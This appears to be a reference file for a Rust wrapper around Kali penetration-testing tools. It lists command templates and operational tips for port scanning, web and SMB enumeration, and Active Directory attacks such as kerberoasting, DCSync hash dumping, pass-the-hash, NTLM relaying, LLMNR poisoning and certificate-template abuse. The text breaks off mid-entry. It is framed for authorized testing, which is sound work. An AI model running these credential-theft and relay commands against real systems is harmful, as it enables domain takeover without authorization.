# TOOLS.md — Shrike Tool Wrapper Reference

Research reference for a Rust CLI framework wrapping Kali offensive tooling. Authorized pentest / OSCP-lab context.

Field conventions (stable — generate Rust structs from these):

- `id` — kebab-case slug, unique.
- `bins` — binary name(s) on PATH (first is canonical).
- `phases` — one or more of: `discovery, port-scan, web-enum, dir-enum, vuln-scan, api-enum, smb-enum, ad-enum, ad-attack, cred-access, cracking, pivot, post-exploit, privesc, loot`.
- `cmd` — command template. Placeholders: `{ip}{port}{url}{domain}{dc_ip}{user}{pass}{nthash}{wordlist}{iface}{outfile}`.
- `required` — placeholders that MUST be filled.
- `speed` — fast / medium / slow.
- `output` — human format + structured-output flag if one exists.
- `artifacts` — data produced for later phases.
- `gotchas` — operational traps.

Placeholder note: `{nthash}` is the NT hash half of an NTLM hash (used for pass-the-hash). `{pass}` and `{nthash}` are mutually exclusive on most auth tools.

---

## 1. Discovery / Port Scanning

### nmap
- **id**: `nmap`
- **name**: Nmap
- **bins**: `nmap`
- **phases**: discovery, port-scan, vuln-scan
- **cmd**: `nmap -sC -sV -p- -Pn -T4 -oA {outfile} {ip}`
- **cmd (UDP top)**: `nmap -sU --top-ports 100 -Pn -oA {outfile} {ip}`
- **cmd (targeted scripts)**: `nmap -p {port} --script "{script}" -oA {outfile} {ip}`
- **required**: `{ip}`
- **speed**: slow (`-p-` full range); medium with top-ports
- **output**: normal/grepable/XML via `-oA` (writes `.nmap/.gnmap/.xml`). Structured: **`-oX`** (XML). No native JSON.
- **artifacts**: open ports, service+version banners, NSE script findings (SMB shares, http titles, ssl certs, hostnames → feeds domain/AD enum)
- **gotchas**: `-Pn` skips host-discovery ping (needed on hosts that drop ICMP); some scan types need root for some scan types; `-sU` is very slow; version scan `-sV` mandatory before choosing web-enum vs smb-enum. Parse `.xml` not stdout.

### rustscan
- **id**: `rustscan`
- **name**: RustScan
- **bins**: `rustscan`
- **phases**: port-scan
- **cmd**: `rustscan -a {ip} --range 1-65535 -- -sC -sV -oX {outfile}`
- **cmd (top)**: `rustscan -a {ip} --top -- -sV`
- **required**: `{ip}`
- **speed**: fast (port sweep), then hands off to nmap
- **output**: greppable stdout; everything after `--` is passed to nmap, so use nmap's `-oX {outfile}` for structured output.
- **artifacts**: open ports → feeds nmap `-sV`
- **gotchas**: `--` separates rustscan args from nmap args; tune `--ulimit 5000` to avoid "too many open files"; nmap must be installed for the service-detection handoff.

### masscan
- **id**: `masscan`
- **name**: Masscan
- **bins**: `masscan`
- **phases**: port-scan, discovery
- **cmd**: `masscan {ip} -p1-65535 --rate 1000 -oJ {outfile}`
- **cmd (subnet)**: `masscan {ip}/24 -p80,443,445,3389 --rate 1000 -oL {outfile}`
- **required**: `{ip}`, port spec
- **speed**: fast (whole-internet-class rates)
- **output**: list/grepable; structured: **`-oJ`** (JSON), `-oX` (XML), `-oL` (list).
- **artifacts**: open ports across large ranges → feeds nmap `-sV` on hits
- **gotchas**: needs root/raw sockets; `--rate` too high drops results and hammers lab nets (keep ≤1000 in labs); no service detection — pair with nmap; uses its own TCP stack (can conflict with host firewall/conntrack).

### naabu
- **id**: `naabu`
- **name**: Naabu
- **bins**: `naabu`
- **phases**: port-scan, discovery
- **cmd**: `naabu -host {ip} -p - -json -o {outfile}`
- **cmd (top)**: `naabu -host {ip} -top-ports 1000 -json -o {outfile}`
- **required**: `{ip}` (`-host`)
- **speed**: fast
- **output**: text `host:port`; structured: **`-json`** (JSONL: `{host,ip,port}`).
- **artifacts**: open ports → pipe to httpx / nmap (`-nmap-cli 'nmap -sV'`)
- **gotchas**: SYN scan (`-s s`) needs root, else falls back to CONNECT; `-p -` = all ports; ProjectDiscovery tool — integrates cleanly with httpx/nuclei pipelines.

---

## 2. Web Enumeration

### httpx
- **id**: `httpx`
- **name**: httpx (ProjectDiscovery)
- **bins**: `httpx`, `httpx-toolkit` (Kali packages it as `httpx-toolkit` to avoid clashing with the Python `httpx` lib)
- **phases**: web-enum, discovery
- **cmd**: `httpx -u {url} -sc -title -tech-detect -server -json -o {outfile}`
- **cmd (from port list)**: `cat ports.txt | httpx -json -o {outfile}`
- **required**: `{url}` or stdin host list
- **speed**: fast
- **output**: colored text; structured: **`-json`** (per-line JSON), `-jsonl`.
- **artifacts**: live web hosts, status codes, titles, tech stack, TLS SANs (→ more hostnames/vhosts), server headers → feeds nuclei/dir-enum
- **gotchas**: **name clash** — on Kali the binary is often `httpx-toolkit`; the pip `httpx` is a Python HTTP library, not this. `-sc` = status-code, `-td` = tech-detect.

### whatweb
- **id**: `whatweb`
- **name**: WhatWeb
- **bins**: `whatweb`
- **phases**: web-enum
- **cmd**: `whatweb -a 3 --log-json {outfile} {url}`
- **required**: `{url}`
- **speed**: fast
- **output**: text; structured: **`--log-json`**, `--log-xml`.
- **artifacts**: CMS + version, frameworks, plugins → decides wpscan vs generic
- **gotchas**: `-a 3` = aggressive (more requests, more accurate); `-a 1` stealthy default.

### nuclei
- **id**: `nuclei`
- **name**: Nuclei
- **bins**: `nuclei`
- **phases**: vuln-scan, web-enum
- **cmd**: `nuclei -u {url} -jsonl -o {outfile}`
- **cmd (severity filter)**: `nuclei -u {url} -severity critical,high -jsonl -o {outfile}`
- **cmd (list)**: `nuclei -l hosts.txt -jsonl -o {outfile}`
- **required**: `{url}` (`-u`) or `-l`
- **speed**: medium
- **output**: colored text; structured: **`-jsonl`** (or `-json`), `-je`/`-jle` for export files.
- **artifacts**: CVE hits, exposures, misconfigs, default creds → feeds exploit selection
- **gotchas**: run `nuclei -update-templates` first; huge template set — filter with `-severity` / `-tags`; rate-limit `-rl` on fragile lab apps.

### feroxbuster
- **id**: `feroxbuster`
- **name**: feroxbuster
- **bins**: `feroxbuster`
- **phases**: dir-enum, web-enum
- **cmd**: `feroxbuster -u {url} -w {wordlist} -x php,html,txt -o {outfile}`
- **required**: `{url}`, `{wordlist}`
- **speed**: fast (recursive, multithreaded)
- **output**: text; structured: **`--json`** (with `-o`), each line JSON.
- **artifacts**: dirs, files, recursively discovered paths → endpoints for exploitation
- **gotchas**: recursion on by default (can explode — cap with `-d {depth}`); `-x` for extensions; `-C 404,403` filter or `--filter-size` to kill soft-404 noise.

### ffuf
- **id**: `ffuf`
- **name**: ffuf
- **bins**: `ffuf`
- **phases**: dir-enum, web-enum, api-enum
- **cmd (dir)**: `ffuf -w {wordlist} -u {url}/FUZZ -o {outfile} -of json`
- **cmd (vhost)**: `ffuf -w {wordlist} -u {url} -H "Host: FUZZ.{domain}" -fs 0 -o {outfile} -of json`
- **cmd (api/param GET)**: `ffuf -w {wordlist} -u {url}?FUZZ=1 -o {outfile} -of json`
- **cmd (api POST body)**: `ffuf -w {wordlist} -u {url} -X POST -d 'FUZZ=1' -H 'Content-Type: application/x-www-form-urlencoded' -o {outfile} -of json`
- **required**: `{wordlist}`, `{url}` (with `FUZZ` marker)
- **speed**: fast
- **output**: text; structured: **`-of json`** (also `-of csv,md,ejson`) with `-o {outfile}`.
- **artifacts**: dirs/files (dir mode), valid vhosts (vhost mode), valid params/API routes (api mode) → endpoints
- **gotchas**: `FUZZ` keyword marks injection point; **vhost mode needs response filtering** (`-fs`/`-fc`/`-fw`) or every guess "matches" the default page; use `-mc all -fc 404` to invert; `-ac` auto-calibrate for soft-404s.

### gobuster
- **id**: `gobuster`
- **name**: Gobuster
- **bins**: `gobuster`
- **phases**: dir-enum, web-enum, discovery
- **cmd (dir)**: `gobuster dir -u {url} -w {wordlist} -x php,html -o {outfile}`
- **cmd (dns)**: `gobuster dns -d {domain} -w {wordlist} -o {outfile}`
- **cmd (vhost)**: `gobuster vhost -u {url} -w {wordlist} --append-domain -o {outfile}`
- **required**: mode, `{wordlist}`, `{url}` or `{domain}`
- **speed**: fast
- **output**: text; **no native JSON** — parse `-o` text file.
- **artifacts**: dirs/files, DNS subdomains, vhosts
- **gotchas**: mode is a subcommand (`dir`/`dns`/`vhost`/`s3`/`fuzz`); newer versions need `--append-domain` in vhost mode; no recursion (single level) — use feroxbuster for recursion.

### katana
- **id**: `katana`
- **name**: Katana
- **bins**: `katana`
- **phases**: web-enum, dir-enum, api-enum
- **cmd**: `katana -u {url} -jc -kf all -d 5 -o {outfile}`
- **cmd (headless + jsluice)**: `katana -u {url} -hl -jc -jsl -d 3 -jsonl -o {outfile}`
- **required**: `{url}` (`-u`)
- **speed**: medium
- **output**: URL list; structured: **`-jsonl`** (`-j`).
- **artifacts**: crawled URLs, JS-extracted endpoints, API paths, params → feed ffuf/nuclei/arjun
- **gotchas**: `-jc` = crawl JS files; `-jsl`/`-jsluice` memory-heavy; `-hl` headless (needs Chromium) for JS-rendered apps; `-kf all` = robots.txt + sitemap.

### nikto
- **id**: `nikto`
- **name**: Nikto
- **bins**: `nikto`
- **phases**: vuln-scan, web-enum
- **cmd**: `nikto -h {url} -o {outfile} -Format json`
- **required**: `{url}` (`-h`)
- **speed**: slow (noisy, thousands of checks)
- **output**: text; structured: **`-Format json`** (also csv/xml/htm) with `-o`.
- **artifacts**: outdated software, dangerous files, misconfigs, default creds
- **gotchas**: extremely noisy/loud — never for stealth; `-Tuning` to select check classes; `-ssl` forced for HTTPS if not auto-detected.

### wpscan
- **id**: `wpscan`
- **name**: WPScan
- **bins**: `wpscan`
- **phases**: web-enum, vuln-scan
- **cmd**: `wpscan --url {url} -e vp,vt,u --plugins-detection aggressive -o {outfile} -f json`
- **cmd (password attack)**: `wpscan --url {url} -U {user} -P {wordlist}`
- **required**: `{url}`
- **speed**: medium
- **output**: text; structured: **`-f json`** with `-o`.
- **artifacts**: WP version, vulnerable plugins/themes, **enumerated usernames** (`-e u`) → feeds cred-access/cracking
- **gotchas**: `--api-token` needed for full vuln data (WPVulnDB); `-e vp,vt,u` = vuln plugins/themes/users; aggressive plugin detection is loud.

### wafw00f
- **id**: `wafw00f`
- **name**: wafw00f
- **bins**: `wafw00f`
- **phases**: web-enum, discovery
- **cmd**: `wafw00f {url} -o {outfile} -f json`
- **required**: `{url}`
- **speed**: fast
- **output**: text; structured: **`-f json`** (also csv) with `-o`.
- **artifacts**: WAF vendor/product present → informs evasion + whether to throttle scanners
- **gotchas**: run before nikto/nuclei so you know whether a WAF will poison results / ban you.

---

## 3. API / Parameter Enumeration

### arjun
- **id**: `arjun`
- **name**: Arjun
- **bins**: `arjun`
- **phases**: api-enum, web-enum
- **cmd**: `arjun -u {url} -oJ {outfile}`
- **cmd (POST)**: `arjun -u {url} -m POST -oJ {outfile}`
- **required**: `{url}` (`-u`)
- **speed**: medium
- **output**: text; structured: **`-oJ`** (JSON), `-oT` (text), `-oB` (send to Burp).
- **artifacts**: hidden GET/POST/JSON parameters → feeds sqlmap/ffuf/manual testing
- **gotchas**: `-m` method (GET/POST/JSON/XML); `-w` custom param wordlist; rate-limit `--stable`/`-d` on fragile apps.

---

## 4. SMB / NetBIOS / RPC / SNMP / LDAP Enumeration

### nxc / netexec
- **id**: `netexec`
- **name**: NetExec (formerly CrackMapExec)
- **bins**: `nxc`, `netexec` (both symlinks; `crackmapexec`/`cme` = old name)
- **phases**: smb-enum, ad-enum, cred-access, ad-attack, post-exploit
- **cmd (smb enum)**: `nxc smb {ip} -u {user} -p {pass}`
- **cmd (null session)**: `nxc smb {ip} -u '' -p '' --shares`
- **cmd (pass-the-hash)**: `nxc smb {ip} -u {user} -H {nthash}`
- **cmd (spray)**: `nxc smb {ip} -u users.txt -p {pass} --continue-on-success`
- **cmd (winrm)**: `nxc winrm {ip} -u {user} -p {pass}`
- **cmd (ldap + bloodhound)**: `nxc ldap {dc_ip} -u {user} -p {pass} --bloodhound --collection All --dns-server {dc_ip}`
- **cmd (mssql)**: `nxc mssql {ip} -u {user} -p {pass} -x whoami`
- **cmd (asreproast)**: `nxc ldap {dc_ip} -u {user} -p {pass} --asreproast {outfile}`
- **cmd (kerberoast)**: `nxc ldap {dc_ip} -u {user} -p {pass} --kerberoasting {outfile}`
- **cmd (secrets dump)**: `nxc smb {ip} -u {user} -p {pass} --sam --lsa --dpapi`
- **required**: protocol, `{ip}`/`{dc_ip}`, `{user}`; one of `{pass}`/`{nthash}`
- **speed**: fast
- **output**: colored text; **no native JSON**, but writes loot to `~/.nxc/` and can export bloodhound zip / roast files via flags.
- **artifacts**: valid creds (marked `[+]`), **`(Pwn3d!)` = admin**, shares, users, password policy, SAM/LSA/DPAPI secrets, AS-REP + TGS hashes, BloodHound data
- **gotchas**: **`nxc` == `netexec` == renamed CrackMapExec** (`cme` deprecated); protocols: `smb winrm ldap mssql ssh rdp ftp wmi vnc`; `(Pwn3d!)` in output = code-exec/local-admin; `-H` takes `LMHASH:NTHASH` or just NT hash; use `--local-auth` for local (non-domain) accounts.

### smbclient
- **id**: `smbclient`
- **name**: smbclient
- **bins**: `smbclient`
- **phases**: smb-enum, loot, post-exploit
- **cmd (list shares)**: `smbclient -L //{ip}/ -N`
- **cmd (auth list)**: `smbclient -L //{ip}/ -U '{domain}\{user}%{pass}'`
- **cmd (connect share)**: `smbclient //{ip}/{share} -U '{user}%{pass}'`
- **required**: `{ip}`
- **speed**: fast
- **output**: interactive/text; no structured output.
- **artifacts**: share listing, file download (`get`/`mget`) → loot (configs, creds, scripts)
- **gotchas**: `-N` = no-password (null session); `-U 'user%pass'` inline; `-c 'ls;get file'` for scripted one-shot; add `-m SMB2`/`--option='client min protocol=NT1'` for legacy SMB1 hosts.

### smbmap
- **id**: `smbmap`
- **name**: smbmap
- **bins**: `smbmap`
- **phases**: smb-enum, loot
- **cmd**: `smbmap -H {ip} -u {user} -p {pass}`
- **cmd (null)**: `smbmap -H {ip} -u '' -p ''`
- **cmd (pth)**: `smbmap -H {ip} -u {user} -p {nthash} --host-report`
- **cmd (recursive)**: `smbmap -H {ip} -u {user} -p {pass} -R {share}`
- **required**: `{ip}` (`-H`)
- **speed**: fast
- **output**: text with **READ/WRITE perms per share** (its key value); no structured export.
- **artifacts**: share names + access level, recursive file listing, can download `--download`
- **gotchas**: shows R/W permissions inline (better than smbclient for triage); `-x` runs a command if admin; PtH via `-p aad3b...:{nthash}` full LM:NT string.

### enum4linux-ng
- **id**: `enum4linux-ng`
- **name**: enum4linux-ng
- **bins**: `enum4linux-ng`, `enum4linux-ng.py`
- **phases**: smb-enum, ad-enum, discovery
- **cmd**: `enum4linux-ng -A {ip} -oJ {outfile}`
- **cmd (auth)**: `enum4linux-ng -A -u {user} -p {pass} {ip} -oJ {outfile}`
- **required**: `{ip}`
- **speed**: medium
- **output**: text; structured: **`-oJ`** (JSON, adds `.json`), `-oY` (YAML), `-oA` (both).
- **artifacts**: domain SID, **users, groups, shares, password policy, OS info, RID-cycled accounts** → feeds AD enum / spraying
- **gotchas**: rewritten Python successor to Perl `enum4linux`; `-A` = all-simple enum; RID cycling (`-R`) finds users even when RestrictAnonymous is set; needs `smbclient`/`rpcclient`/`ldapsearch` present.

### rpcclient
- **id**: `rpcclient`
- **name**: rpcclient
- **bins**: `rpcclient`
- **phases**: smb-enum, ad-enum
- **cmd (null)**: `rpcclient -U '' -N {ip}`
- **cmd (auth)**: `rpcclient -U '{user}%{pass}' {ip}`
- **required**: `{ip}`
- **speed**: fast
- **output**: interactive; no structured output.
- **artifacts**: via commands `enumdomusers`, `enumdomgroups`, `querydominfo`, `queryuser <rid>`, `lsaenumsid`, `enumprinters` → users, RIDs, SIDs
- **gotchas**: null session (`-U '' -N`) may be blocked; scriptable with `-c 'enumdomusers'`; `lookupnames`/`lookupsids` for SID↔name; classic for RID → username mapping.

### showmount
- **id**: `showmount`
- **name**: showmount (NFS)
- **bins**: `showmount`
- **phases**: smb-enum, discovery, loot
- **cmd**: `showmount -e {ip}`
- **required**: `{ip}`
- **speed**: fast
- **output**: text export list; no structured output.
- **artifacts**: exported NFS shares + allowed hosts → mount and loot (`mount -t nfs {ip}:/export /mnt`)
- **gotchas**: part of `nfs-common`; `-e` = show exports; world-readable/`no_root_squash` exports = privesc (UID-spoofing) opportunity.

### snmpwalk
- **id**: `snmpwalk`
- **name**: snmpwalk
- **bins**: `snmpwalk`, `snmp-check` (companion)
- **phases**: discovery, smb-enum, loot
- **cmd**: `snmpwalk -v2c -c public {ip}`
- **cmd (full MIB)**: `snmpwalk -v2c -c public {ip} .1.3.6.1 -Oa`
- **required**: `{ip}`, community string
- **speed**: medium
- **output**: OID/value text; no structured output.
- **artifacts**: running processes, listening ports, installed software, **usernames**, network shares, sometimes plaintext creds → feeds cred-access
- **gotchas**: default community `public` (RO) / `private` (RW); brute communities with `onesixtyone`; `-v2c` common, `-v1` fallback; SNMPv3 needs auth args. `snmp-check {ip} -c public` gives a nicer summary.

### ldapsearch
- **id**: `ldapsearch`
- **name**: ldapsearch
- **bins**: `ldapsearch`
- **phases**: ad-enum, discovery
- **cmd (anon naming context)**: `ldapsearch -x -H ldap://{ip} -s base namingcontexts`
- **cmd (dump)**: `ldapsearch -x -H ldap://{dc_ip} -D '{user}@{domain}' -w {pass} -b 'DC=domain,DC=local'`
- **cmd (users)**: `ldapsearch -x -H ldap://{dc_ip} -D '{user}@{domain}' -w {pass} -b 'DC=domain,DC=local' '(objectClass=user)' sAMAccountName`
- **required**: `{ip}`/`{dc_ip}`, base DN
- **speed**: medium
- **output**: LDIF text; no JSON (use ldapdomaindump for structured).
- **artifacts**: users, groups, computers, **`description` fields (often hold passwords)**, SPNs, `userAccountControl` flags (AS-REP roastable, no-preauth) → feeds roasting
- **gotchas**: `-x` = simple bind; anonymous bind often allows base-DSE only; watch for creds in `description`/`info` attributes; `-b` base DN is mandatory for real queries.

---

## 5. Active Directory Enumeration & Attack

### bloodhound-python
- **id**: `bloodhound-python`
- **name**: BloodHound.py ingestor
- **bins**: `bloodhound-python`
- **phases**: ad-enum
- **cmd**: `bloodhound-python -u {user} -p {pass} -d {domain} -dc {dc_ip} -ns {dc_ip} -c All --zip`
- **required**: `{user}`, `{pass}` (or `--hashes`), `{domain}`, `{dc_ip}`
- **speed**: medium
- **output**: **JSON files** (users/groups/computers/…), `--zip` bundles them for BloodHound GUI ingest.
- **artifacts**: full AD graph — ACLs, sessions, group memberships, attack paths (Kerberoastable, DCSync rights, unconstrained delegation) → drives ad-attack choices
- **gotchas**: `-c All` (no LDAP-based session data) vs `-c DCOnly` (stealthy, no host touch); needs working DNS to the DC (`-ns {dc_ip}`); clock skew breaks Kerberos auth — `ntpdate {dc_ip}` first; use `--hashes :{nthash}` for PtH; ingest into BloodHound CE (SharpHound v6/CE JSON format).

### certipy
- **id**: `certipy`
- **name**: Certipy (AD CS)
- **bins**: `certipy`, `certipy-ad`
- **phases**: ad-enum, ad-attack, cred-access, privesc
- **cmd (find vuln)**: `certipy find -u {user}@{domain} -p {pass} -dc-ip {dc_ip} -vulnerable -stdout`
- **cmd (find all → files)**: `certipy find -u {user}@{domain} -p {pass} -dc-ip {dc_ip} -stdout -json`
- **cmd (ESC1 request)**: `certipy req -u {user}@{domain} -p {pass} -dc-ip {dc_ip} -target {ip} -ca '{ca_name}' -template '{template}' -upn administrator@{domain}`
- **cmd (auth w/ pfx → hash/TGT)**: `certipy auth -pfx administrator.pfx -dc-ip {dc_ip}`
- **cmd (ESC8 relay)**: `certipy relay -target 'http://{ip}' -template DomainController`
- **cmd (shadow creds / ESC ownership)**: `certipy shadow auto -u {user}@{domain} -p {pass} -account {target_user}`
- **required**: `{user}`,`{pass}`/`-hashes`, `{domain}`, `{dc_ip}`; for req also `-ca` + `-template`
- **speed**: medium
- **output**: text (`-stdout`); structured: **`-json`** (and BloodHound export via `-bloodhound`); writes `.pfx` cert files.
- **artifacts**: vulnerable templates tagged **ESC1–ESC16**, CA names, issued `.pfx` certs → `certipy auth` yields the target's **NT hash + Kerberos TGT** → DCSync/PtH
- **gotchas**: package is `certipy-ad` (pip) / binary `certipy`; supports ESC1-ESC16 (`find -vulnerable` flags them); ESC1 = `-upn` arbitrary SAN; **clock skew** breaks `auth`/`req` → `ntpdate {dc_ip}` or `faketime`; `auth` returns hash for pass-the-hash; use `-key-size`/`-target` (the CA host) correctly — `-target` is the CA/web-enroll host, `-dc-ip` the DC.

### ldapdomaindump
- **id**: `ldapdomaindump`
- **name**: ldapdomaindump
- **bins**: `ldapdomaindump`
- **phases**: ad-enum
- **cmd**: `ldapdomaindump -u '{domain}\{user}' -p {pass} {dc_ip} -o {outfile}`
- **required**: `{user}`, `{pass}`, `{dc_ip}`
- **speed**: fast
- **output**: **HTML + JSON + greppable** (`domain_users.json`, `domain_computers.json`, `domain_groups.json`, etc.) into the `-o` dir.
- **artifacts**: users, groups, computers, policies, trust info, `userAccountControl` decoded → offline triage of AD objects
- **gotchas**: `-o` is a directory; `--no-html`/`--no-json` to trim; PtH via `-u user -p aad3b...:{nthash}`; quick structured dump when you don't want the full BloodHound graph.

### windapsearch
- **id**: `windapsearch`
- **name**: windapsearch
- **bins**: `windapsearch`, `windapsearch.py`
- **phases**: ad-enum
- **cmd**: `windapsearch -d {domain} --dc {dc_ip} -u {user} -p {pass} --da`
- **cmd (privileged users)**: `windapsearch -d {domain} --dc {dc_ip} -u {user} -p {pass} -PU`
- **required**: `{domain}`, `{dc_ip}`, `{user}`, `{pass}`
- **speed**: fast
- **output**: text; no structured export.
- **artifacts**: `--da` domain admins, `-U` users, `-C` computers, `-G` groups, `-PU` privileged users, `--unconstrained` delegation targets → targeting
- **gotchas**: two forks exist (Python `ropnop`, Go `ropnop/go-windapsearch`); anonymous bind supported when allowed; fast focused queries vs a full dump.

---

## 6. Impacket Suite

All impacket scripts share the **target spec** `'{domain}/{user}:{pass}@{ip}'` and accept `-hashes LMHASH:NTHASH` (or `:{nthash}`) for pass-the-hash, and `-k -no-pass` for Kerberos ticket auth (needs `KRB5CCNAME`). Kali binaries are prefixed `impacket-` (e.g. `impacket-GetNPUsers`) and also present as raw `.py` names.

### impacket-GetNPUsers (AS-REP roast)
- **id**: `impacket-getnpusers`
- **name**: GetNPUsers (AS-REP Roasting)
- **bins**: `impacket-GetNPUsers`, `GetNPUsers.py`
- **phases**: ad-attack, cred-access
- **cmd (with creds)**: `impacket-GetNPUsers {domain}/{user}:{pass} -dc-ip {dc_ip} -request -format hashcat -outputfile {outfile}`
- **cmd (userlist, no creds)**: `impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -usersfile users.txt -no-pass -format hashcat -outputfile {outfile}`
- **required**: `{domain}`, `{dc_ip}`; users.txt if no creds
- **speed**: fast
- **output**: text; `-outputfile` writes hashes; `-format hashcat` or `-format john`.
- **artifacts**: **AS-REP hashes** (`$krb5asrep$`) for accounts with "Do not require preauth" → crack with **hashcat mode 18200**
- **gotchas**: no creds needed if you have a userlist (finds only preauth-disabled accts); `-format hashcat` matters for the cracker; clock skew → ntpdate.

### impacket-GetUserSPNs (Kerberoast)
- **id**: `impacket-getuserspns`
- **name**: GetUserSPNs (Kerberoasting)
- **bins**: `impacket-GetUserSPNs`, `GetUserSPNs.py`
- **phases**: ad-attack, cred-access
- **cmd**: `impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {dc_ip} -request -outputfile {outfile}`
- **required**: `{domain}`, `{user}`, `{pass}`, `{dc_ip}`
- **speed**: fast
- **output**: text table + `-outputfile` hashes.
- **artifacts**: **TGS-REP hashes** (`$krb5tgs$`) for accounts with SPNs → crack with **hashcat 13100** (RC4) or **19700** (AES). Also lists SPN/account names.
- **gotchas**: needs any valid domain cred; RC4 tickets (13100) crack far faster than AES (19700) — target RC4 SPNs; `-request-user {user}` to target one; clock skew sensitive.

### impacket-secretsdump
- **id**: `impacket-secretsdump`
- **name**: secretsdump (DCSync / SAM / LSA)
- **bins**: `impacket-secretsdump`, `secretsdump.py`
- **phases**: cred-access, post-exploit, loot
- **cmd (remote DCSync)**: `impacket-secretsdump {domain}/{user}:{pass}@{dc_ip} -just-dc-ntlm -outputfile {outfile}`
- **cmd (PtH local SAM)**: `impacket-secretsdump -hashes :{nthash} {domain}/{user}@{ip}`
- **cmd (from files)**: `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
- **required**: target spec; creds or `-hashes`
- **speed**: medium
- **output**: text; `-outputfile` writes `.ntds`/`.sam`/`.secrets`.
- **artifacts**: **NTLM hashes for all domain users** (`-just-dc`), SAM local hashes, LSA secrets, cached DCC2, machine account keys → PtH / cracking (NTLM 1000, DCC2 2100)
- **gotchas**: `-just-dc-ntlm` = just NTLM (skip Kerberos keys/history); needs DCSync rights (Domain Admin / `DS-Replication-Get-Changes`); `-just-dc-user krbtgt` for golden-ticket key; cached-domain-creds crack as **hashcat 2100**.

### impacket exec family (psexec / smbexec / wmiexec / atexec)
- **id**: `impacket-exec`
- **name**: Impacket Remote Exec (psexec/smbexec/wmiexec/atexec)
- **bins**: `impacket-psexec`, `impacket-smbexec`, `impacket-wmiexec`, `impacket-atexec` (+ `.py`)
- **phases**: post-exploit, pivot, cred-access
- **cmd (psexec)**: `impacket-psexec {domain}/{user}:{pass}@{ip}`
- **cmd (wmiexec PtH)**: `impacket-wmiexec -hashes :{nthash} {domain}/{user}@{ip}`
- **cmd (smbexec)**: `impacket-smbexec {domain}/{user}:{pass}@{ip}`
- **cmd (atexec one-shot)**: `impacket-atexec {domain}/{user}:{pass}@{ip} "whoami"`
- **required**: target spec; creds or `-hashes`; needs **admin** on target
- **speed**: fast
- **output**: interactive shell (psexec/smbexec/wmiexec) or command output (atexec); no structured output.
- **artifacts**: SYSTEM/admin shell → post-exploit, further dumping
- **gotchas**: all need local-admin. **psexec** = drops a service binary (noisy, AV-flagged) but full interactive SYSTEM; **smbexec** = semi-interactive, stealthier, no binary drop; **wmiexec** = WMI, no binary, cleanest for OPSEC; **atexec** = scheduled-task, single command. Try wmiexec first for stealth.

### impacket-ntlmrelayx
- **id**: `impacket-ntlmrelayx`
- **name**: ntlmrelayx
- **bins**: `impacket-ntlmrelayx`, `ntlmrelayx.py`
- **phases**: ad-attack, cred-access, post-exploit
- **cmd (relay to SMB, dump)**: `impacket-ntlmrelayx -tf targets.txt -smb2support`
- **cmd (relay to LDAP, delegation)**: `impacket-ntlmrelayx -t ldap://{dc_ip} --delegate-access --escalate-user {user}`
- **cmd (relay to LDAPS, add computer for RBCD)**: `impacket-ntlmrelayx -t ldaps://{dc_ip} --delegate-access --no-dump`
- **cmd (ESC8 AD CS relay)**: `impacket-ntlmrelayx -t http://{ca_ip}/certsrv/certfnsh.asp --adcs --template DomainController`
- **required**: `-t`/`-tf` target
- **speed**: n/a (waits for incoming auth)
- **output**: text; dumps SAM/hashes, or issues certs/creates delegation; `-of` loot output.
- **artifacts**: relayed auth → dumped SAM hashes, new machine account (RBCD), ADCS cert, or DA escalation
- **gotchas**: pair with **responder** (turn Responder's SMB/HTTP **off** so relay can bind those ports) or **mitm6**; SMB-signing must be **disabled** on the target to relay SMB→SMB (`nxc smb ... --gen-relay-list`); `-6` for IPv6 (mitm6 combo); relay to LDAP needs signing/channel-binding not enforced.

### impacket-getST / getTGT (delegation, RBCD, constrained)
- **id**: `impacket-getst`
- **name**: getST / getTGT (Kerberos ticket abuse)
- **bins**: `impacket-getST`, `getST.py`, `impacket-getTGT`, `getTGT.py`
- **phases**: ad-attack, cred-access, privesc
- **cmd (getTGT)**: `impacket-getTGT {domain}/{user}:{pass} -dc-ip {dc_ip}` → writes `{user}.ccache`
- **cmd (constrained deleg S4U)**: `impacket-getST -spn cifs/{target_host} -impersonate administrator {domain}/{user}:{pass} -dc-ip {dc_ip}`
- **cmd (RBCD)**: `impacket-getST -spn cifs/{target_host} -impersonate administrator -hashes :{nthash} {domain}/{computer}\$ -dc-ip {dc_ip}`
- **required**: `{domain}`, `{user}`/computer acct + secret, `-spn`, `-impersonate`, `{dc_ip}`
- **speed**: fast
- **output**: `.ccache` Kerberos ticket file (set `export KRB5CCNAME=admin.ccache`).
- **artifacts**: impersonated-user service ticket → use with `-k -no-pass` on psexec/secretsdump for privesc to that host
- **gotchas**: after getST, `export KRB5CCNAME={outfile}.ccache` then run exec tool with `-k -no-pass`; RBCD flow: add computer (via ntlmrelayx/addcomputer) → set `msDS-AllowedToActOnBehalfOfOtherIdentity` (via rbcd.py) → getST with new computer's hash; constrained delegation needs the account to have `msDS-AllowedToDelegateTo`; **clock skew** → ntpdate.

### responder
- **id**: `responder`
- **name**: Responder
- **bins**: `responder`
- **phases**: cred-access, ad-attack, discovery
- **cmd**: `responder -I {iface} -w -d`
- **cmd (analyze only)**: `responder -I {iface} -A`
- **required**: `{iface}`
- **speed**: n/a (passive/poison, waits)
- **output**: console + logs to `/usr/share/responder/logs/` (hashes in `.txt`), SQLite db.
- **artifacts**: **NetNTLMv1/v2 hashes** from LLMNR/NBT-NS/MDNS poisoning → crack with **hashcat 5600 (NetNTLMv2)** / 5500 (v1); captured usernames
- **gotchas**: turn **SMB + HTTP servers OFF** in `/etc/responder/Responder.conf` when combining with ntlmrelayx; `-A` analyze mode = passive (no poisoning, safe for recon); NetNTLMv2 = **5600**, not relayable if signing enforced but still crackable; needs L2 adjacency to victims.

### mitm6
- **id**: `mitm6`
- **name**: mitm6
- **bins**: `mitm6`
- **phases**: cred-access, ad-attack
- **cmd**: `mitm6 -d {domain} -i {iface}`
- **required**: `{domain}` (`-d`), `{iface}` (`-i`)
- **speed**: n/a (waits, poisons)
- **output**: console log; feeds ntlmrelayx (no file output of its own).
- **artifacts**: IPv6 DNS takeover → funnels victim auth into ntlmrelayx (`-6`) → relayed creds / WPAD auth
- **gotchas**: almost always paired: `mitm6 -d {domain}` + `impacket-ntlmrelayx -6 -t ldaps://{dc_ip} -wh fakewpad.{domain} --delegate-access`; abuses default IPv6-preference in Windows; noisy/network-wide — scope carefully in labs; will DoS-ish the segment if left running.

### coercer / petitpotam
- **id**: `coercer`
- **name**: Coercer / PetitPotam (auth coercion)
